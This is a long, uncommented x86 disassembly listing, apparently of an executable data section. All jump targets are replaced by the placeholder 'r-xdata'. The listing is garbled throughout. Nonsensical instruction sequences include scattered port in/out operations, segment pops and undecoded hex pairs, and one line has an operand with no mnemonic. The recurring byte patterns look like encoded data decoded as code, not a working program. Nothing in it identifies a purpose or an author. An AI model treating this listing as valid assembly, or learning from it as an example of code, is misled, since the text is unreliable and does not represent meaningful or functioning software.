jae r-xdata
jae r-xdata
aaa
push ds
sbb al 0x1c
mov bl 0xb0
push 0x5e
aaa
ja r-xdata
sahf
or esp [ ecx - 0x45e3e3ff ]
jae r-xdata
jecxz r-xdata
loop r-xdata
jae r-xdata
jae r-xdata
daa
out dx eax
or al [ eax ]
xor eax 0x73731c1c
jae r-xdata
mov edi 0xb32354ec
jae r-xdata
jae r-xdata
int1
cmp [ esp + ebx ] bl
outsb
sbb al 0x66
and ebp esp
and bp sp
sti
mov ch 0xb
mov eax [ 0xffffffffba1c1c01 ]
jae r-xdata
or dh [ ecx ]
or eax 0x73731c1c
jae r-xdata
mov al 0xa
unpckhps xmm3 [ esp + ebx ]
jecxz r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
sbb al 0x60
mov bl 0x68
jae r-xdata
adc bl [ esp + ebx ]
in al dx
jae r-xdata
xchg ecx eax
jae r-xdata
sbb al 0x1c
jae r-xdata
mov edi 0xbdc0abb
jae r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jecxz r-xdata
jae r-xdata
mov al 0xb5
mov [ edi + 0x1c07710a ] esp
sbb al 0x73
jae r-xdata
in al dx
jae r-xdata
jae r-xdata
mov ch 0x89
cmpsd [ esi ] [ edi ]
or dh [ ecx + 0x7 ]
sbb al 0x1c
sbb ecx [ ecx - 0x6f54465 ]
xor ebx [ esp + ebx ]
jae r-xdata
test [ edx - 0x5a ] ebp
adc [ ebx + 0x6a85cd89 ] edi
cmpsb [ esi ] [ edi ]
pop ss
mov ebx 0x15a66a85
mov [ esi - 0x59957a45 ] eax
fisttp [ 0x73731c1c ]
mov esi [ ebx ]
loop r-xdata
jae r-xdata
jae r-xdata
in al dx
nop
and eax 0x1c34c70b
jae r-xdata
push esp
cld
sbb al 0xec
jae r-xdata
or ch [ ecx + 0x12 ]
sbb al 0x1c
jae r-xdata
or dh ah
xor edi [ ebx + 0x1c0c370a ]
push 0xffffffa6
jae r-xdata
outsb
je r-xdata
jae r-xdata
or bl ah
jae r-xdata
jecxz r-xdata
sahf
or ecx [ edx ]
0x731c1c19 0x7373
jae r-xdata
mov sp 0x1c39
jae r-xdata
jae r-xdata
mov [ 0xffffffffc7e76afb ] eax
push 0x20bac7e7
shl [ ebx ] 0x1
jae r-xdata
sbb al 0x73
jae r-xdata
jecxz r-xdata
jecxz r-xdata
daa
jecxz r-xdata
sub [ ecx + ecx * 4 - 0x49957a5f ] edi
jpo r-xdata
push 0xffffff9e
jecxz r-xdata
jae r-xdata
and esi [ ebx - 0x38f4da98 ]
jae r-xdata
push ds
sbb al 0x1c
sbb al 0xb5
sub [ esp + ebx ] ebx
jae r-xdata
mov ebp 0x550a2366
sbb al 0x73
jae r-xdata
jecxz r-xdata
jecxz r-xdata
sub bx [ esi ]
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
push 0xe26aefae
jae r-xdata
jae r-xdata
and al 0xa6
pop edx
shl ebx cl
jecxz r-xdata
or cl [ ecx ]
nop [ esi * 4 + 0xabbbf89 ] ebx
jecxz r-xdata
or ebx [ esp + ebx ]
jae r-xdata
jae r-xdata
or dh dl
add al 0x1c
jae r-xdata
mov [ 0x1c0af70a ] eax
jae r-xdata
jecxz r-xdata
jae r-xdata
shl [ ebx ] 0x1
mov [ edi + 0x41b66a85 ] edx
or ebp [ ebx ]
cmp ebx [ esp + ebx ]
jecxz r-xdata
or cl [ ecx + 0x73e3e3ea ]
mov ebx esp
jae r-xdata
push 0x34c70b25
jae r-xdata
or cl [ edi ]
jae r-xdata
jae r-xdata
cmp [ eax - 0x1c9c8ae4 ] dh
jecxz r-xdata
in al 0xe3
sbb al 0x97
sbb al 0x60
jae r-xdata
sbb al 0x1c
mov bl 0x1c
push ds
jae r-xdata
sbb al 0x1c
pushad
in al dx
push 0xa2cc811
jae r-xdata
mov bl 0x68
cmpsb [ esi ] [ edi ]
sbb ebp [ eax + 0x63 ]
inc edi
jecxz r-xdata
mov edx 0xd81fa66a
and ah ch
jecxz r-xdata
push 0xe085cda0
cmpsd [ esi ] [ edi ]
loop r-xdata
jae r-xdata
mov al 0xa
out dx eax
jae r-xdata
sbb al 0x73
jae r-xdata
or dh [ edi ]
or al 0x1c
mov ebx 0x1c33f30a
sbb al 0x73
jae r-xdata
jb r-xdata
xchg [ eax - 0x1e ] ebp
push 0xa368efa3
out dx eax
jecxz r-xdata
sbb al 0x73
jae r-xdata
sbb al 0x74
arpl bx sp
mov esi 0x11390a37
sbb al 0x1c
cmp [ esp + ebx ] ebx
mov [ eax - 0x5441957b ] eax
mov eax 0xa9be6a85
push 0xbe6a853b
scasd [ edi ]
push 0xbe6a853a
lodsd [ esi ]
push 0x3810a3c
sbb al 0x1c
jae r-xdata
test [ edx ] 0x73731c1c
jae r-xdata
pushad
daa
out dx eax
or eax [ eax - 0x5 ]
jecxz r-xdata
mov ebx esp
mov ch 0xb
sub edi [ ebx ]
sbb al 0x1c
test [ edx - 0x62 ] ebp

fsub [ esp + ebp * 8 ]
cmp bl [ esp + ebx ]
aaa
sbb al 0x75
dec edi
jae r-xdata
xor al 0x1c
or eax edi
jae r-xdata
adc eax 0x73731c1c
jae r-xdata
jae r-xdata
or bl bh
or eax 0x73731c1c
add bl [ esp + ebx ]
sbb al 0x96
daa
jae r-xdata
sbb al 0xb3
jae r-xdata
enter 0xa2c 0xfe
jecxz r-xdata
jae r-xdata
push 0xffffffbe
aaa
or bh [ ecx ]
adc [ esp + ebx ] ebx
jecxz r-xdata
pushfd
jmp r-xdata
aaa
push 0xffffffa6
sbb al 0x1c
jae r-xdata
loop r-xdata
jae r-xdata
hlt
jae r-xdata
mov edx 0x73737320
or dh [ edx + 0x2f ]
sbb al 0x73
test [ edx - 0x5a ] ebp
pop ss
mov ebx 0x1c2f720a
sbb al 0x73
in al dx
add al 0x1c
test [ edx - 0x5a ] ebp
jae r-xdata
or [ edi ] ecx
jae r-xdata
push 0xe76afba3
jae r-xdata
sbb al 0x1c
sbb al 0x1c
jae r-xdata
popad
push ss
jae r-xdata
sbb al 0x73
jae r-xdata
sub [ esp + ebx ] ebx
jae r-xdata
mov ah 0x1c
mov ch 0xeb
sbb al 0x1c
jae r-xdata
jae r-xdata
push 0xef0f600f
jae r-xdata
sbb al 0x1c
jae r-xdata
or ch [ edi + edx ]
sbb al 0xb5
xchg [ eax + 0x2b ] esp
loope r-xdata
jae r-xdata
jae r-xdata
and ebp ebx
mov bl 0x1c
xchg esi eax
pop es
push 0xffffffbe
aas
sbb al 0xb4
sti
mov ah 0xb
pushad
sbb bl [ ebx + esi ]
or bl [ ebx + ebp * 8 + 0x7373e3e3 ]
mov al 0xb0
mov al 0x25
cmpsb [ esi ] [ edi ]
cvtdq2ps xmm4 [ esi ]
jae r-xdata
sbb al 0x1c
jae r-xdata
or ah [ edx + 0x731c1c02 ]
jae r-xdata
jecxz r-xdata
jae r-xdata
or dl [ ebx + 0x12 ]
sbb al 0x1c
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
sbb al 0x1c
jae r-xdata
or ch [ edx + 0x13 ]
sbb al 0x1c
jae r-xdata
and esp [ ebx + 0x1c0af70a ]
scasb [ di ]
sbb al 0x73
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
test eax 0x6ee3e3e7
mov dh 0xb
or ah [ esi + 0x731c1c2f ]
sbb al 0x73
jae r-xdata
mov ch 0xeb
jae r-xdata
jae r-xdata
jae r-xdata
and al 0x1c
jae r-xdata
add al 0x1c
sbb al 0xb5
push 0x6012c813
and ah cl
nop
push 0xffffffa6
sbb ebp [ esi - 0x5a ]
or ah [ bx + si + 0xb ]
sbb al 0x1c
jae r-xdata
sbb al 0x6e
jae r-xdata
jae r-xdata
or dh [ esi - 0x76e3e3fc ]
mul [ bx ]
sbb al 0x1c
or al [ ebx + 0x6ae3e3e7 ]
cmpsb [ esi ] [ edi ]
pop ds
shl [ ebx ] 0x1
fisub [ esi + 0x25c80a1f ]
sbb al 0x1c
push 0xffffffa6
pop ds
fsub [ eax ]
in al dx
adc bl [ esp + ebx ]
mov edi esp
outsb
mov ebx 0x1c0c370a
jae r-xdata
mov ch 0x89
jae r-xdata
jae r-xdata
jae r-xdata
mov ch 0x68
adc ah [ esi + 0x15 ]
in al dx
adc edx [ bx ]
movsb [ edi ] [ esi ]
in al dx
or ebp [ ecx + 0x6ee3e3e7 ]
jae r-xdata
jae r-xdata
rcr [ edx + ecx ] 0x1
jae r-xdata
out 0xe3 eax
jae r-xdata
jae r-xdata
sbb al 0xa
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
push 0xfba368e3
push 0xffffffe7
or dh bl
xor ebx [ esp + ebx ]
jae r-xdata
jae r-xdata
jae r-xdata
jmp r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
or bh [ ebx ]
add bl [ esp + ebx ]
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
mov [ 0x731c1c02 ] al
jae r-xdata
pushad
lahf
mov al 0xb4
mov dh 0x68
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
test [ edx - 0x5a ] ebp
jae r-xdata
jae r-xdata
mov bl 0x87
sbb al 0x96
push 0x13e0df93
jae r-xdata
cmp eax [ edx ]
sbb al 0x1c
nop
imul edx [ ebx - 0x1d ] 0xffffffe3
jecxz r-xdata
imul ebp [ esi + 0x17130aef ] 0x73731c1c
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
punpcklbw mmx1 [ edi ]
out dx eax
jae r-xdata
or bh [ esi + 0x2f ]
sbb al 0x1c
jae r-xdata
outsb
jae r-xdata
jae r-xdata
add [ esp + ebx ] bl
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
or ah [ ecx - 0x18 ]
jecxz r-xdata
push 0x68301c12
and eax 0x1c16aa0a
fnstsw ax
jae r-xdata
dec esp
jae r-xdata
jae r-xdata
push ds
outsd
je r-xdata
jae r-xdata
jae r-xdata
pxor mm6 [ eax - 0x1f5df54c ]
jecxz r-xdata
jae r-xdata
or ecx [ edx ]
cmpsb [ esi ] [ edi ]
das
sbb al 0x1c
jae r-xdata
sbb al 0x74
jae r-xdata
sbb al 0x73
jae r-xdata
jae r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
outsb
jae r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
sbb al 0x73
jae r-xdata
or ch [ ebp + 0x1ce3e3e5 ]
adc esp [ edx - 0x23 ]
jae r-xdata
outsb
cmpsb [ esi ] [ edi ]
jae r-xdata
or cl [ ecx + ebp + 0x1c ]
jecxz r-xdata
jae r-xdata
jae r-xdata
mov ch 0x87
pushad
sub esp ecx
mov bl 0xa
sub al 0x17
cmpsb [ esi ] [ edi ]
sbb esi [ ebx - 0x1df4da98 ]
mov edx 0x66ec2366
push 0x6e1c1c37
jae r-xdata
or ah [ eax + esi * 8 + 0x7373e3e3 ]
jae r-xdata
or esp edx
mov bl 0x24
jae r-xdata
scasb [ edi ]
jae r-xdata
adc cl [ ecx + 0x24e389e3 ]
cmpsb [ esi ] [ edi ]
push ss
mov ebx esp
mov ebx esp
test [ esi ] esp
and eax 0x245b0fa6
cmpsb [ esi ] [ edi ]
shl [ ebx ] 0x1
mov [ edx + ebp * 2 ] ebx
sahf
pop ds
sbb al 0x75
outsd
jecxz r-xdata
mov esp edi
out dx eax
jae r-xdata
adc eax 0x190a1c1c
dec edi
jae r-xdata
jae r-xdata
test al 0xe3
jae r-xdata
dec di
mov al 0x6e
jae r-xdata
jae r-xdata
jae r-xdata
loop r-xdata
jae r-xdata
scasb [ edi ]
out dx eax
or dl [ ebx ]
pop ss
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
pop ss
or al dh
out 0xe3 al
jecxz r-xdata
jae r-xdata
and eax 0x1c24e20b
jecxz r-xdata
jae r-xdata
or ah [ edx - 0x451c1c20 ]
and bp sp
push 0x1c37
sbb al 0x6e
mov bl 0xb0
sbb al 0xb5
cmpsd [ esi ] [ edi ]
push 0xae681fa6
jecxz r-xdata
jae r-xdata
push 0xffffffe2
jae r-xdata
jae r-xdata
mov al 0x89
jecxz r-xdata
jae r-xdata
xor ebx [ esp + ebx ]
sbb al 0x1c
jae r-xdata
jae r-xdata
pop ebx
scasb [ edi ]
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
popad
mov edi 0x89e3e3ee
jecxz r-xdata
pop ds
shr [ edx ] 0x1
pushad
sbb ebx [ esp + ebp * 8 ]
jbe r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
jecxz r-xdata
mov ch 0xb5
imul esi ebx 0xe3e66d0a
jae r-xdata
jae r-xdata
jae r-xdata
and al 0xe3
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
out dx eax
mov [ esi + 0x2da66a85 ] edx
test [ edx - 0x5a ] ebp
xor ecx [ edx ]
pop ecx
cmp ebx [ esp + ebx ]
mov ebx esp
sbb al 0xb3
scasd [ edi ]
jae r-xdata
movsd [ edi ] [ esi ]
xlat
mov bl 0xa
sub al 0x16
sbb al 0x1c
jae r-xdata
mov edi esp
outsb
jae r-xdata
0xaa0ae3e3 0xe3f0
sub ebp [ ecx - 0xd ]
jae r-xdata
jae r-xdata
fsubrp st3
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
insd
out 0xe3 eax
jecxz r-xdata
or [ esp + ebx ] bl
sbb al 0x96
jae r-xdata
jae r-xdata
xchg edi eax
sbb al 0xba
mov edx 0x7373202a
jae r-xdata
or ch [ ebp - 0x1a ]
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
push 0xffffffaf
add ebp [ edx - 0x5a ]
xchg esi eax
jae r-xdata
push ebx
jae r-xdata
test [ edx ] 0x1c1c0f60
jae r-xdata
jae r-xdata
or esp ebx
jmp r-xdata
sbb ecx [ ebx - 0x7c0da6d2 ]
mov ah 0x6a
pop ebp
aaa
jecxz r-xdata
jae r-xdata
mov bl 0xb3
jecxz r-xdata
out 0x8b eax
jecxz r-xdata
retn
sahf
rol [ esi + 0x53 ] cl
mov ah 0x6a
movsd [ edi ] [ esi ]
out dx eax
or ch [ ebx ]
cmp [ esp + ebx ] ebx
jae r-xdata
jecxz r-xdata
or ch [ ebp - 0x1a ]
jae r-xdata
mov [ ebp - 0x59957b ] ecx
or bh [ edi - 0x16 ]
mov ah 0x66
sub ch ah
jecxz r-xdata
out 0xe3 al
push 0x22e0dfa2
in al dx
mov ecx 0xda85e3e3
jae r-xdata
or eax esp
sbb al 0xa
sbb [ ebx ] esi
sbb al 0x1c
enter 0x692b 0xf3
jae r-xdata
jg r-xdata
jae r-xdata
out dx eax
sbb al 0x1c
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
test [ edx - 0x5a ] ebp
jae r-xdata
mov bl 0xa6
jecxz r-xdata
jae r-xdata
jae r-xdata
loop r-xdata
jae r-xdata
arpl bx sp
jae r-xdata
cmpsb [ esi ] [ edi ]
aas
out 0x6e eax
push 0xb66a8532
nop [ ecx + edi * 4 ] ebx
test [ edx - 0x4a ] ebp
jae r-xdata
pushad
jae r-xdata
jae r-xdata
add eax edx
xor [ ecx - 0x49957a73 ] ecx
push 0xffffffb6
or esi esp
in al 0xe3
jecxz r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
loop r-xdata
jecxz r-xdata
jecxz r-xdata
pop es
sbb al 0x1c
add bh [ esi ]
mov edx 0x73202aba
jae r-xdata
test al 0xe3
mov ch 0xb4
sub ch ah
insd
jae r-xdata
fsub [ eax ]
or ch [ edx + 0x73e3e3f0 ]
jae r-xdata
or cl al
xor bl [ esp + ebx ]
shr [ 0x6aba1c1c ] 0x1
jae r-xdata
sbb al 0x1c
jecxz r-xdata
jae r-xdata
xchg esi eax
jae r-xdata
mov dh 0x1b
push 0xe60a1fa6
jae r-xdata
or [ edx ] ecx
cmpsb [ esi ] [ edi ]
jae r-xdata
mov ecx [ esi ]
jae r-xdata
jecxz r-xdata
jae r-xdata
out dx al
jecxz r-xdata
mov ecx 0x1b66a85
sbb al 0x1c
jae r-xdata
jae r-xdata
pop ebx
push 0xef900a33
jecxz r-xdata
sub esp ebx
jecxz r-xdata
movsb [ edi ] [ esi ]
cmp [ esp + ebx ] bl
jae r-xdata
scasb [ edi ]
or [ esp + ebx ] bl
mov bl 0xb0
jae r-xdata
jae r-xdata
adc [ esp + ebx ] ebx
jae r-xdata
or dl [ esi ]
mov [ 0x1f86609b ] eax
jecxz r-xdata
sbb al 0x1c
mov bl 0x6e
push di
sbb ebx [ esp + ebx ]
mov bl 0xa
push ss
sub ebx [ esi ]
or bh [ edx + 0x73e3e3e8 ]
jae r-xdata
and bp sp
jae r-xdata
push 0xffffffa6
jecxz r-xdata
jae r-xdata
mov ebx 0xc39368c7
jae r-xdata
and cx [ edx ]
sbb esp edx
push 0xb31ceba6
jae r-xdata
out 0x6e eax
sbb al 0x1c
arpl [ esi + 0x66ece2f3 ] bx
add bh [ esi ]
jae r-xdata
jecxz r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
pop es
test [ edx - 0x4a ] ebp
jecxz r-xdata
pop esp
sbb al 0x1c
jae r-xdata
das
jae r-xdata
loop r-xdata
sbb al 0x1c
outsb
in al 0xe3
jecxz r-xdata
or ebp edi
sbb al 0x1c
mov al 0x89
jae r-xdata
jae r-xdata
jecxz r-xdata
and ch [ eax - 0x65 ]
[ eax - 0x45 ]
mov al 0x1c
jae r-xdata
mov eax 0xa1c1c00
and eax 0x731c1c2b
jae r-xdata
in al dx
jecxz r-xdata
jecxz r-xdata
lea edx [ esi ]
sbb al 0x1c
jae r-xdata
and ecx [ edx ]
loop r-xdata
loopne r-xdata
push 0xa368c393
jae r-xdata
jecxz r-xdata
lea eax [ ebp + 0xaffa66a ]
sbb al 0x1c
jae r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
jae r-xdata
jecxz r-xdata
les ecx [ 0x27601c1c ]
cmpsb [ esi ] [ edi ]
jae r-xdata
jecxz r-xdata
jae r-xdata
jecxz r-xdata
mov ecx 0x661c1c01
and ebp esp
out 0xe3 eax
jecxz r-xdata
shl [ ecx ] 0x1
mov dh 0x1
jecxz r-xdata
rcr [ esp ] 0x1
and bp sp
out dx al
aam 0x3f
sbb al 0x1c
push 0x236033a6
fcom [ ebx ]
or ah [ ecx - 0x1b ]
sbb al 0x89
jecxz r-xdata
or dh [ ebp - 0xe ]
jecxz r-xdata
or eax 0xa46e1c1c
jae r-xdata
retn
jae r-xdata
sbb al 0x96
or ebx [ esp + esi * 2 ]
jcxz r-xdata
loop r-xdata
shl ebx 0x1
jecxz r-xdata
mov [ 0xffffffffec22e0df ] al
hlt
jae r-xdata
mov al 0x6e
sub bx [ esi ]
sbb al 0x1c
jae r-xdata
push 0xffffffa6
sbb al 0x1c
loopne r-xdata
retn
jae r-xdata
jae r-xdata
mov ebx esp
or ch [ ebp - 0x19 ]
jecxz r-xdata
mov edx 0xffc7a76a
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
mov eax [ esi + 0x5a ]
jecxz r-xdata
sbb al 0xb4
jae r-xdata
jae r-xdata
sbb al 0x96
lahf
push 0xffffff9f
sbb al 0xb
mov edx [ esi ]
sbb al 0x1c
push 0xaa68ebae
fild [ eax - 0x4b ]
mov bl 0xa
insb
or ecx [ ebx + 0x681c1c16 ]
scasb [ edi ]
mov bl 0xaf
jae r-xdata
movsb [ edi ] [ esi ]
sbb al 0x6e
sbb al 0xb4
mov al 0xa
jae r-xdata
mov edx [ eax ]
xchg edi eax
xchg [ eax + 0x38a40ab4 ] dh
sbb al 0x1c
jecxz r-xdata
xor [ esp + ebx ] edx
rcr [ esp + esi * 4 ] 0x1
mov ah 0xa
movsd [ edi ] [ esi ]
cmp ebx [ esp + ebx ]
jae r-xdata
or bl [ ecx ]
pop edi
add eax 0x6eb01c1c
sbb esp [ esi + 0x23 ]
in al dx
outsb
das
sbb al 0x1c
shl [ ebx ] 0x1
mov esp 0x202ab8bd
mov [ 0xffffffffe01ae0fb ] eax
jae r-xdata
cmpsd [ esi ] [ edi ]
or edx ecx
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
xchg [ esi + edx * 4 ] ebx
sbb al 0xb3
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sti
push 0x65
pop ss
jecxz r-xdata
sbb al 0x60
daa
jecxz r-xdata
div [ si - 0xff5 ]
or eax 0xbaba1c1c
and bp sp
jmp r-xdata
inc esi
pop edx
mov bh 0xa
jae r-xdata
jae r-xdata
sbb al 0x75
add esp ebx
jecxz r-xdata
sbb al 0x96
pop ds
sbb al 0x96
pop es
sbb al 0x33
or cl cl
cmp bl [ esp + ebx ]
jae r-xdata
mov [ ebp + 0x7b66a85 ] ecx
cmp esp ebx
jecxz r-xdata
xchg esi eax
jae r-xdata
push edx
sbb bl [ esp + ebx ]
jae r-xdata
mov ebp [ esi ]
pop ecx
xor [ edx + ebp * 2 - 0x1c1cc8a3 ] 0xffffffe3
or ebp [ esi - 0x74e3e3f8 ]
adc [ edi + 0xab4b086 ] dl
and ebp [ edx - 0x42 ]
add ebp [ edx - 0x42 ]
pop ss
test eax ebx
movsd [ edi ] [ esi ]
in eax 0xec
pushad
jmp r-xdata
jae r-xdata
loopne r-xdata
jae r-xdata
sub eax 0x6aba1c1c
jae r-xdata
jae r-xdata
jae r-xdata
popad
call 0x73ba3222
nop [ ebx + esi * 2 ] ebx
jae r-xdata
push 0xffffffb6
sbb ebp [ eax - 0x5a ]
pop ds
or ah dh
xchg ebx eax
jae r-xdata
sbb al 0x73
mov al [ 0x2366bad7 ]
in al dx
shl ebp 0x1
or eax 0x1b656ab0
jecxz r-xdata
push cs
mov bl 0x68
and eax 0x1c12d80b
adc bh dh
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0xb5
scasd [ edi ]
or cl bh
sub [ esp + ebx ] ebx
jae r-xdata
sbb ebp [ eax + 0x3d ]
test [ edx - 0x42 ] ebp
jae r-xdata
mov al 0xb0
mov ebx eax
mov al 0xb0
or dl [ edx + 0x1a ]
sbb al 0x1c
sbb al 0x73
jae r-xdata
outsb
cmpsd [ esi ] [ edi ]
mov [ 0x27c60a1d ] al
sbb al 0x1c
jae r-xdata
sbb al 0x1c
jae r-xdata
mov dh 0x7
sbb [ eax + 0x3b ] ebp
test [ edx - 0x42 ] ebp
pop ds
or ah [ ebx ]
aaa
sbb al 0x1c
jae r-xdata
test [ edx - 0x42 ] ebp
adc ecx [ ecx + 0x6a85b896 ]
mov esi 0xb88a8911
test [ edx - 0x42 ] ebp
pop ss
push 0xbe6a853c
adc eax 0x6a853b68
mov esi 0x853d681b
push 0xffffffbe
cmp ah al
push 0xffffffa6
add [ ebx + 0x6a85c189 ] edi
cmpsb [ esi ] [ edi ]
pop es
or bl ch
sbb ebx [ esp + ebx ]
jae r-xdata
jae r-xdata
sbb al 0xba
jae r-xdata
jecxz r-xdata
pushad
and [ edx ] cl
enter 0x1c32 0x1c
jae r-xdata
loopne r-xdata
mov bl 0x1c
mov ch 0xeb
pushad
cwde
mov [ 0xffffffffcb67ece3 ] eax
jecxz r-xdata
jecxz r-xdata
push 0x36d40b1d
sbb al 0x1c
pushad
daa
out dx eax
fiadd [ ebx - 0x131c1cf7 ]
in eax 0xe3
jecxz r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
or bl [ esp + ebx ]
jae r-xdata
sbb al 0xba
and bp sp
sub [ es : esp + ebx ] bl
and ch ah
push ebx
pop ebp
sbb al 0x1c
or al [ ebx ]
sbb al 0x1c
jae r-xdata
jecxz r-xdata
shl [ ebx ] 0x1
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
push 0xffffffa7
jae r-xdata
jae r-xdata
stosb [ edi ]
in al dx
cmpsd [ esi ] [ edi ]
out 0xe3 eax
daa
sbb bl [ esp + ebx ]
push 0x66bad7a0
and ebp esp
jecxz r-xdata
mov ah [ ebx - 0x1cd8aae4 ]
jecxz r-xdata
mov [ 0xffffffffd0ebb51c ] eax
sbb al 0xa
sbb al 0x90
outsb
jae r-xdata
jae r-xdata
and bp sp
inc eax
adc [ esp + ebx ] bl
sbb al 0x1c
mov ch 0xaf
jecxz r-xdata
xlat
sbb al 0x6a
jae r-xdata
or al [ ebx + 0xb ]
sbb al 0x1c
in al dx
push esp
test [ edx - 0xd ] ebp
test [ esi + 0x31 ] esp
or ah dh
sbb [ esp + ebx ] ebx
jae r-xdata
or ah [ ecx + 0x36 ]
sbb al 0x1c
out dx eax
jecxz r-xdata
mov edi 0xc7a76ee3
jae r-xdata
jae r-xdata
jae r-xdata
xchg [ 0x73731c1c ] dl
jae r-xdata
push 0xffffffa5
jae r-xdata
push 0x1ae0fba3
jae r-xdata
loope r-xdata
jae r-xdata
mov ah 0xb7
jae r-xdata
jae r-xdata
iretd
movsd [ edi ] [ esi ]
outsb
sub bx [ esi ]
sbb al 0x1c
mov bl 0xb0
mov al 0x89
stc
mov al 0x1c
jne r-xdata
jae r-xdata
jecxz r-xdata
pushad
daa
out dx eax
pushad
xchg edi eax
jae r-xdata
push 0xffffffae
pushad
jecxz r-xdata
sbb al 0x75
arpl bx sp
jecxz r-xdata
mov ebp 0x73202ab8
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sti
jae r-xdata
jecxz r-xdata
sbb al 0x1c
jae r-xdata
or dh [ ebx + 0x37 ]
jae r-xdata
mov eax [ ecx + 0x45 ]
or [ eax ] 0xb4
or eax [ ebx - 0x74e3e3f6 ]
lodsb [ ss : esi ]
xchg ecx eax
sub [ esp + ebx ] ebx
or eax [ edi + esi ]
adc esi [ edx + ecx + 0x1c1c5d3a ]
jae r-xdata
xchg esi eax
sbb eax 0x73731c1c
jae r-xdata
mov ah 0xb4
mov al 0xa
mov [ edx ] ss
sbb al 0x1c
jae r-xdata
sub al 0x1c
pushfd
jae r-xdata
cmpsd [ esi ] [ edi ]
mov edi 0x1c39070a
sbb al 0x73
jae r-xdata
mov ah 0x6a
movsd [ edi ] [ esi ]
fisttp [ edx ]
or al [ ebx + 0x8 ]
sbb al 0x1c
sub ah [ eax ]
jae r-xdata
jae r-xdata
jae r-xdata
and edi [ ebp + 0x73202ab8 ]
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0xa7
sbb ah al
jae r-xdata
or ah [ ebp + 0x1ce3e3e3 ]
jae r-xdata
aaa
jae r-xdata
0x7373e3e3 0xb073
mov dl 0x1c
xchg ebx eax
pop ds
push 0xebaee0eb
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
test [ edx - 0x5a ] ebp
jae r-xdata
jae r-xdata
xchg edi eax
jae r-xdata
sbb al 0x1c
and bp sp
xchg esi eax
aaa
and esp ebx
mov eax 0x7373202a
jae r-xdata
jae r-xdata
out 0xe3 eax
in al dx
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
outsw
sbb al 0x6e
jae r-xdata
jae r-xdata
push 0xffffffa6
jmp r-xdata
jae r-xdata
shr [ edx ] 0x1
and bp sp
jpe r-xdata
and ebp esp
outsb
sbb [ si ] bl
adc eax 0xa66a85bb
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
jae r-xdata
outsb
outsb
sbb ebx [ esi ]
sbb al 0x1c
or bh [ esp + edi ]
sbb al 0x1c
jae r-xdata
and [ ebx + 0x73 ] dh
loopne r-xdata
jae r-xdata
push 0x65878b3b
adc [ esi - 0x5442954c ] dl
or ecx [ ebp + 0x6a1c1c0a ]
adc ch [ edx - 0x5a ]
mov ah 0x6a
movsd [ edi ] [ esi ]
jecxz r-xdata
jae r-xdata
jae r-xdata
add [ ebx ] edi
sti
jae r-xdata
sbb al 0x1c
scasb [ edi ]
jmp r-xdata
jae r-xdata
jmp r-xdata
or bl [ edx - 0x7ae3e3cd ]
push 0xffffffa6
mov ebx 0x1ba66a85
shl [ ebx ] 0x1
test [ edx - 0x5a ] ebp
jae r-xdata
jae r-xdata
jae r-xdata
jne r-xdata
in al dx
push esp
mov al 0x60
and ah cl
mov ah 0x68
sbb [ edx ] ecx
or ebx [ ebp + 0x1c ]
sbb al 0x73
jae r-xdata
cmp [ esp + ebx ] ebp
jecxz r-xdata
and esp ebx
jae r-xdata
xchg edi eax
jae r-xdata
jne r-xdata
jae r-xdata
mov ch 0x68
jae r-xdata
xor ebx [ esi ]
cmpsb [ esi ] [ edi ]
sbb esi [ ebx + 0x1c1d050a ]
sbb al 0x73
jae r-xdata
mov [ eax + 0x1c2b140a ] edx
sbb al 0x73
jae r-xdata
or al [ ecx ]
jae r-xdata
push 0x2f730a1b
sbb edx eax
and eax [ ebp - 0x74e65996 ]
out 0xe2 eax
jecxz r-xdata
push 0xffffffa6
sbb al 0x74
jae r-xdata
sbb al 0x1c
jae r-xdata
jecxz r-xdata
jae r-xdata
outsb
cmpsb [ esi ] [ edi ]
inc ebx
mov bl 0x68
and eax 0x1c31340a
sbb al 0x73
mov dl 0xb0
mov ch 0xa
inc ebx
or ebx [ esp + ebx ]
push 0x223a0b25
sbb al 0x1c
mov edx 0x66ec2366
sub [ es : esp + ebx ] bl
sbb al 0xa
jae r-xdata
mov esp edi
loop r-xdata
jecxz r-xdata
push 0x202aeba6
jae r-xdata
jae r-xdata
